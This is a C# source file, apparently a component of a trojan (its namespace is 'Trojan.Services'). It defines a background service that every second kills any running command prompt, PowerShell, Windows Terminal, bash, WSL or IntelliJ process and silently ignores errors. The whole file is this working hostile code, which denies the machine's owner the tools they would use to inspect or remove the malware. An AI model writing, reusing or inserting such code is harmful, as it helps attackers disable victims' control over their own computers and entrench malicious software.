using System.Diagnostics;

namespace Trojan.Services
{
    public class CmdBlockerService
    {
        private bool _running;

        private readonly string[] _blockedProcesses =
        {
            "cmd",
            "powershell",
            "pwsh",
            "WindowsTerminal",
            "wt",
            "bash",
            "wsl",
            "intellij"
        };

        public void Start()
        {
            _running = true;

            Task.Run(async () =>
            {
                while (_running)
                {
                    foreach (string processName in _blockedProcesses)
                    {
                        try
                        {
                            Process[] processes =
                                Process.GetProcessesByName(processName);

                            foreach (Process process in processes)
                            {
                                process.Kill();
                            }
                        }
                        catch
                        {
                        }
                    }

                    await Task.Delay(1000);
                }
            });
        }

        public void Stop()
        {
            _running = false;
        }
    }
}